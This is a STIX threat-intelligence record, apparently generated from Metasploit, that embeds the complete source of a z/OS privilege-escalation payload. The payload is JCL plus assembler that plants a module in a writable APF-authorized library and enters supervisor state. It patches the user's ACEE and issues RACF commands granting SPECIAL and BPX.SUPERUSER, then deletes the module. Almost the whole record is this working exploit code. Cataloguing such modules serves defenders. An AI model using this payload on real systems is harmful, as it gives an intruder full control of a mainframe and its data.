{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--47b69828-d806-4bc1-8070-07decb178f73",
    "created": "2024-08-14T16:33:19.295449Z",
    "modified": "2024-08-14T16:33:19.295453Z",
    "name": "JCL to Escalate Privileges",
    "description": "(Elevate privileges for user. Adds SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using an unsecured/updateable APF authorized library (APFLIB) and updating the user's ACEE using this program/library.  Note: This privesc only works with z/OS systems using RACF, no other ESM is supported.)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/mainframe/apf_privesc_jcl.rb",
            "external_id": "apf_privesc_jcl.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This is a JCL command payload for z/OS - mainframe.\n#   It will escalate privileges of an account on the system if the user\n#   can identify a writable APF authorised library \"APFLIB\"\n#\n#   See https://www.ibm.com/support/knowledgecenter/zosbasics/com.ibm.zos.zsecurity/zsecc_060.htm\n#   for more information on APF Authorized Libraries\n#\n#   Thank you to Ayoub & The Brummie for the assembler ideas.\n#\n#   To-do (BeS 4/11/17)\n#     Add options for privileges that can be added.\n#     Auto scan for writable APF authorized library.\n##\n\n\nmodule MetasploitModule\n  CachedSize = 3156\n  include Msf::Payload::Single\n  include Msf::Payload::Mainframe\n\n  def initialize(info = {})\n    super(merge_info(\n      info,\n      'Name'          => 'JCL to Escalate Privileges',\n      'Description'   => %q{(Elevate privileges for user. Adds\n         SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using\n         an unsecured/updateable APF authorized library (APFLIB) and updating\n         the user's ACEE using this program/library.  Note: This privesc only\n         works with z/OS systems using RACF, no other ESM is supported.)},\n      'Author'        =>\n        [\n          'Bigendian Smalls',\n          'Ayoub'\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'mainframe',\n      'Arch'           => ARCH_CMD,\n      'Handler'        => Msf::Handler::None,\n      'Session'        => Msf::Sessions::MainframeShell,\n      'PayloadType'    => 'cmd',\n      'RequiredCmd'    => 'jcl',\n      'Payload'        =>\n      {\n        'Offsets' => {},\n        'Payload' => ''\n      }\n    ))\n    register_options(\n      [\n        Opt::RPORT(21),\n        OptString.new('ACTNUM', [true, \"Accounting info for JCL JOB card\", \"MSFUSER-ACCTING-INFO\"]),\n        OptString.new('PGMNAME', [true, \"Programmer name for JCL JOB card\", \"programmer name\"]),\n        OptString.new('JCLASS', [true, \"Job Class for JCL JOB card\", \"A\"]),\n        OptString.new('NOTIFY', [false, \"Notify User for JCL JOB card\", \"\"]),\n        OptString.new('MSGCLASS', [true, \"Message Class for JCL JOB card\", \"Z\"]),\n        OptString.new('MSGLEVEL', [true, \"Message Level for JCL JOB card\", \"(0,0)\"]),\n        OptString.new('APFLIB', [true, \"APF Authorized Library to use\", \"SYS1.LINKLIB\"])\n      ],\n      self.class\n    )\n    register_advanced_options(\n      [\n        OptBool.new('NTFYUSR', [true, \"Include NOTIFY Parm?\", false]),\n        OptString.new('JOBNAME', [true, \"Job name for JCL JOB card\", \"DUMMY\"])\n      ],\n      self.class\n    )\n  end\n\n  ##\n  # Construct Payload\n  ##\n  def generate(_opts = {})\n    super + command_string\n  end\n\n  ##\n  # Setup replacement vars from options if need be\n  ##\n  def command_string\n    jcl_jobcard +\n      \"//S1        EXEC ASMACLG,PARM.L='AC(1)'\\n\" \\\n      \"//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR\\n\" \\\n      \"//          DD DSN=SYS1.MACLIB,DISP=SHR\\n\" \\\n      \"//L.SYSLMOD DD DISP=SHR,DSN=#{datastore['APFLIB']}(APFPRIV)\\n\" \\\n      \"//C.SYSIN   DD *,DLM=ZZ\\n\" \\\n      \"         TITLE  'APF MISCONFIG PRIVESC FOR MSF'\\n\" \\\n      \"APFPRIV  CSECT\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"*         SETUP registers and save areas                              *\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"MAIN     STM   14,12,12(13)    # Save caller reg\\n\" \\\n      \"         LR    8,15            # Base register\\n\" \\\n      \"         USING MAIN,8          # R8 for addressability\\n\" \\\n      \"         GETMAIN RU,LV=72      # for our savearea\\n\" \\\n      \"         ST    13,4(,1)        # Store Caller's SA address\\n\" \\\n      \"         ST    1,8(,13)        # Put my SA addr in caller's SA\\n\" \\\n      \"         LR    13,1            # R13 has addr of our SA\\n\" \\\n      \"         DS    0H              # halfword boundaries\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"* MAIN PROGRAM STMTS HERE                                             *\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"         BAL   6,AUTHUSR       # branch authuser routine\\n\" \\\n      \"         B     EXITP           # exit time\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"* AUTHUSER ROUTINE                                                    *\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"AUTHUSR  MODESET KEY=ZERO,MODE=SUP  # let's get into supervisor mode!\\n\" \\\n      \"         L     11,X'224'       # R11 points to ASCB\\n\" \\\n      \"         L     11,X'6C'(11)    # R11 points to ASXB\\n\" \\\n      \"         L     11,X'C8'(11)    # R11 points to ACEE\\n\" \\\n      \"         NI    X'26'(11),X'00' # Clear Byte x'26'\\n\" \\\n      \"         OI    X'26'(11),X'B1' # Add Oper & Special to userproc\\n\" \\\n      \"         NI    X'27'(11),X'00' # Clear Byte x'27\\n\" \\\n      \"         OI    X'27'(11),X'80' # ALTER access to all resource\\n\" \\\n      \"         MODESET KEY=NZERO,MODE=PROB # back to normal\\n\" \\\n      \"         XR    15,15           # set rc=0 regardless\\n\" \\\n      \"         BR    6               # R6 has return reg\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"*        Cleanup and exit - R15 has exit code                         *\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"EXITP    LR    1,13            # Move my SA into R1\\n\" \\\n      \"         LR    2,15            # SAVE RC\\n\" \\\n      \"         L     13,4(,13)       # RST Caller SA Addr\\n\" \\\n      \"         L     14,12(13)       # Reload R14\\n\" \\\n      \"         FREEMAIN RU,A=(1),LV=72\\n\" \\\n      \"         LR    15,2            # RESTORE RC\\n\" \\\n      \"         LM    0,12,20(13)     # Reload all but 14/15\\n\" \\\n      \"         BCR   15,14           # Branch back to caller\\n\" \\\n      \"         END   APFPRIV            # end pgm\\n\" \\\n      \"ZZ\\n\" \\\n      \"//S2        EXEC PGM=IKJEFT01\\n\" \\\n      \"//SYSTSIN   DD *\\n\" \\\n      \" ALU #{datastore['FTPUSER']} SPECIAL\\n\" \\\n      \" PE BPX.SUPERUSER CLASS(FACILITY) ID(#{datastore['FTPUSER']}) ACCESS(READ)\\n\" \\\n      \" SETR RACL(FACILITY) REF\\n\" \\\n      \"/*\\n\" \\\n      \"//SYSIN     DD DUMMY\\n\" \\\n      \"//SYSTSPRT  DD SYSOUT=*\\n\" \\\n      \"//S3        EXEC PGM=IDCAMS\\n\" \\\n      \"//SYSPRINT  DD SYSOUT=*\\n\" \\\n      \"//TEMPDD    DD DSN=#{datastore['APFLIB']},DISP=SHR\\n\" \\\n      \"//SYSIN     DD *\\n\" \\\n      \" DELETE #{datastore['APFLIB']}(APFPRIV) FILE(TEMPDD)\\n\" \\\n      \"/*\\n\" \\\n  end\nend\n",
    "x_mitre_platforms": [
        "mainframe'"
    ]
}